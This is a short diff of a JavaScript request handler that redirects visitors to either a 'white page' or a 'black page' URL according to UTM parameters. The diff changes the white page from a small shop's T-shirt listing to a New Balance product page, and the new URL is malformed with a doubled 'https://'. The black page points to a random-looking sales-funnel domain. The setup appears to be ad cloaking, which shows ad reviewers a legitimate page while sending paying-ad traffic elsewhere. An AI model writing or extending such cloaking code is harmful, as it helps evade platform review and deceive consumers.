@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.gusgusdesigns.co.uk/t-shirt-support-your-local-farmers--olive-green-6918-p.asp";
+    const whitePageURL = "https://https://www.newbalance.com/pd/made-in-usa-woven-track-top/MT41541.html";
     const blackPageURL = "https://adffuaorrd.myfunnelish.com/women-pink-socks-1736427651655748";
   
     // Parse the UTM parameters from the request URL
